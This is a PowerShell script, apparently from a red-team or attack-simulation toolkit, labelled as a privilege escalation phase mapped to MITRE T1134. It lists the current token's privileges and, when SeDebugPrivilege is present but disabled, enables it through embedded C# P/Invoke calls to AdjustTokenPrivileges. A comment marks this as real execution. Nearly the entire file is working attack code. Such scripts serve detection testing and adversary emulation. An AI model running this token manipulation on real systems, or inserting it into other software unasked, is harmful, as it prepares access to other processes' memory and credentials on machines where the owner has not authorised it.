$ErrorActionPreference = "Continue"
Write-Host "[*] Performing Privilege Escalation Check..."

$current = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Write-Host "[*] Current User: $current"

Write-Host "[*] Enumerating Token Privileges (T1134)..."
$privs = whoami /priv 
$privs | Out-Host

if ($privs -match "SeDebugPrivilege") {
    if ($privs -match "Disabled") {
         Write-Host "`n[*] Attempting to Enable 'SeDebugPrivilege'..."
         
         # REAL EXECUTION: Use embedded C# to adjust token
         $code = @"
using System;
using System.Runtime.InteropServices;

public class TokenManipulator {
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

    [DllImport("kernel32.dll", ExactSpelling = true)]
    internal static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);

    [DllImport("advapi32.dll", SetLastError = true)]
    internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    internal struct TokPriv1Luid {
        public int Count;
        public long Luid;
        public int Attr;
    }

    internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
    internal const int TOKEN_QUERY = 0x00000008;
    internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;

    public static bool EnableDebugPrivilege() {
        IntPtr htok = IntPtr.Zero;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok)) return false;

        TokPriv1Luid tp;
        tp.Count = 1;
        tp.Luid = 0;
        tp.Attr = SE_PRIVILEGE_ENABLED;

        if (!LookupPrivilegeValue(null, "SeDebugPrivilege", ref tp.Luid)) return false;

        if (!AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero)) return false;

        return true;
    }
}
"@
        try {
            Add-Type -TypeDefinition $code
            $res = [TokenManipulator]::EnableDebugPrivilege()
            if ($res) {
                Write-Host "    [+] SeDebugPrivilege Enabled Successfully!"
            } else {
                Write-Host "    [-] Failed to adjust token."
            }
        } catch {
            Write-Host "    [-] Error during P/Invoke: $_"
        }
    } else {
        Write-Host "`n[+] SeDebugPrivilege is already Enabled."
    }
} else {
    Write-Host "`n[-] SeDebugPrivilege not present in token. Cannot escalate."
}

Write-Host "`n[+] Escalation Phase Complete."
